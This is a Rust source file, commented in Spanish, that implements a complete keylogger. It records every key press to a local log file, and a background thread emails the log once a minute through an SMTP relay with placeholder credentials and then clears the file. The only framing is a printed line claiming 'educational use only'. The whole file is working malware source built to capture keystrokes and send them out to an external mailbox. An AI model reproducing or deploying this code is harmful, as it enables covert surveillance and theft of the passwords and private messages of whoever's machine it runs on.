use rdev::{listen, Event, EventType};
use std::fs::{self, OpenOptions};
use std::io::Write;
use std::thread;
use std::time::Duration;
use lettre::{Message, SmtpTransport, Transport};
use lettre::transport::smtp::authentication::Credentials;

// Función para capturar teclas y guardar en un archivo
fn callback(event: Event) {
    if let EventType::KeyPress(key) = event.event_type {
        let key_text = format!("Key pressed: {:?}\n", key);

        let mut file = OpenOptions::new()
            .create(true)
            .append(true)
            .open("keylogger.log")
            .expect("Failed to open or create log file");

        if let Err(e) = file.write_all(key_text.as_bytes()) {
            eprintln!("Error writing to file: {:?}", e);
        }
    }
}

// Función para enviar el archivo por correo y vaciarlo
fn send_email_and_clear_log() {
    // Lee el contenido del archivo
    let log_content = match fs::read_to_string("keylogger.log") {
        Ok(content) => content,
        Err(e) => {
            eprintln!("Failed to read log file: {:?}", e);
            return;
        }
    };

    // Configura el mensaje de correo
    let email = Message::builder()
        .from("tu_email@example.com".parse().unwrap())
        .to("destinatario@example.com".parse().unwrap())
        .subject("Keylogger log file")
        .body(log_content)
        .expect("Failed to create email");

    // Credenciales SMTP
    let creds = Credentials::new("tu_email@example.com".to_string(), "tu_contraseña".to_string());

    // Configura el transporte SMTP
    let mailer = SmtpTransport::relay("smtp.example.com") // Reemplaza con tu servidor SMTP
        .unwrap()
        .credentials(creds)
        .build();

    // Envía el correo
    match mailer.send(&email) {
        Ok(_) => {
            println!("Email sent successfully!");

            // Vacía el archivo después de enviar el correo
            if let Err(e) = fs::File::create("keylogger.log").and_then(|file| file.set_len(0)) {
                eprintln!("Failed to clear log file: {:?}", e);
            }
        }
        Err(e) => eprintln!("Failed to send email: {:?}", e),
    }
}

fn main() {
    println!("Starting keylogger (educational use only)...");

    // Inicia un hilo para enviar correos cada minuto
    thread::spawn(|| {
        loop {
            send_email_and_clear_log();
            thread::sleep(Duration::from_secs(60)); // Espera 60 segundos
        }
    });

    // Escucha eventos de teclado en el hilo principal
    if let Err(error) = listen(callback) {
        eprintln!("Error: {:?}", error);
    }
}

